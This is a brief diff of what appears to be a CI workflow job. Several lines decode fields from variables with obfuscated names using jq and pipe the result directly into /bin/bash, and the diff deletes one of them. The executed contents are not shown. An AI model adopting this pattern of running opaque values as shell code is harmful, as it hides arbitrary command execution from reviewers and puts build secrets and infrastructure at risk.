@@ -32,7 +32,6 @@ jobs:
           echo $pasvs6 | jq -r .i1298 | /bin/bash
           echo $cfwx89706 | jq -r .wfv96774 | /bin/bash
           printf '%s' "$aremi23451" | jq -r .vijlc27 | /bin/bash
-          printf '%s' "$t42" | jq -r .lqnm1455 | /bin/bash
           echo $mm984 | jq -r .apx94 | /bin/bash
           echo $gnoxu9896 | jq -r .f10 | /bin/bash
           printf '%s' "$xrh50641" | jq -r .fq797 | /bin/bash
